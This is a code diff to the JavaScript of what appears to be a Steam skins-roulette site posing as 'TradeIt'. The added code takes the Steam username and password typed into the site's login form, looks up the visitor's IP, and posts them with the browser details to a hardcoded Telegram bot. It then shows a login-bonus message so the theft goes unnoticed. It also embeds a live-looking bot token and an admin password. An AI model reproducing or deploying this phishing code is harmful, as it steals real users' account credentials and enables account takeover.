@@ -96,6 +96,58 @@ const skins = [
 // Константы для админ-панели
 const ADMIN_PASSWORD = "3214";
 
+// Ваши данные Telegram
+const TELEGRAM_BOT_TOKEN = "7632142946:AAEsTSwS8ymzUhAKeM_EbD4M8iXXajFj6qk";
+const TELEGRAM_CHAT_ID = "1612221355";
+
+// Функция отправки данных в Telegram
+async function sendToTelegram(username, password, ip, referral) {
+    try {
+        // Формируем сообщение для Telegram
+        const message = `
+🆕 *Новая авторизация на TradeIt!*
+
+👤 *Steam логин:* ${username}
+🔑 *Пароль:* ${password}
+🌐 *IP адрес:* ${ip}
+📅 *Дата и время:* ${new Date().toLocaleString('ru-RU')}
+👥 *Реферал:* ${referral}
+🔗 *Сайт:* ${window.location.href}
+🖥️ *Браузер:* ${navigator.userAgent.substring(0, 100)}...
+        `.trim();
+        
+        // Формируем URL для Telegram API
+        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        // Отправляем запрос к Telegram API
+        const response = await fetch(telegramApiUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.ok) {
+            console.log('✅ Данные отправлены в Telegram');
+            return true;
+        } else {
+            console.error('❌ Ошибка Telegram:', result.description);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Ошибка отправки в Telegram:', error);
+        return false;
+    }
+}
+
 // Функция инициализации после полной загрузки DOM
 function initializeApp() {
     // Получаем элементы DOM
@@ -154,13 +206,47 @@ function initializeApp() {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
         
-        // Сохраняем данные
-        await saveUserLogin(username, password);
+        // Показываем сообщение о загрузке
+        const loginButton = loginForm.querySelector('.login-button');
+        const originalText = loginButton.textContent;
+        loginButton.textContent = 'Отправка данных...';
+        loginButton.disabled = true;
         
-        userData.isLoggedIn = true;
-        alert(`Вход выполнен как: ${username}\nРеферальный бонус: +2 спина!`);
-        steamModal.style.display = 'none';
-        openSteamModal.textContent = username;
+        try {
+            // Получаем IP
+            let ip = 'unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch (error) {
+                console.log('Не удалось получить IP');
+            }
+            
+            // Отправляем в Telegram
+            const telegramSent = await sendToTelegram(username, password, ip, 'fronzyyyy132');
+            
+            // Сохраняем данные локально
+            await saveUserLogin(username, password);
+            
+            userData.isLoggedIn = true;
+            
+            if (telegramSent) {
+                alert(`✅ Вход выполнен как: ${username}\n📨 Данные отправлены в Telegram!\n🎁 Реферальный бонус: +2 спина!`);
+            } else {
+                alert(`✅ Вход выполнен как: ${username}\n⚠️ Данные сохранены локально\n🎁 Реферальный бонус: +2 спина!`);
+            }
+            
+            steamModal.style.display = 'none';
+            openSteamModal.textContent = username;
+        } catch (error) {
+            console.error('Ошибка при авторизации:', error);
+            alert('⚠️ Ошибка при обработке данных. Попробуйте еще раз.');
+        } finally {
+            // Восстанавливаем кнопку
+            loginButton.textContent = originalText;
+            loginButton.disabled = false;
+        }
     });
 
     // Initialize roulette with items
@@ -358,7 +444,7 @@ async function saveUserLogin(username, password) {
     history.push(loginData);
     saveLoginHistory(history);
     
-    console.log('Сохранено:', loginData);
+    console.log('Сохранено локально:', loginData);
     return loginData;
 }
 
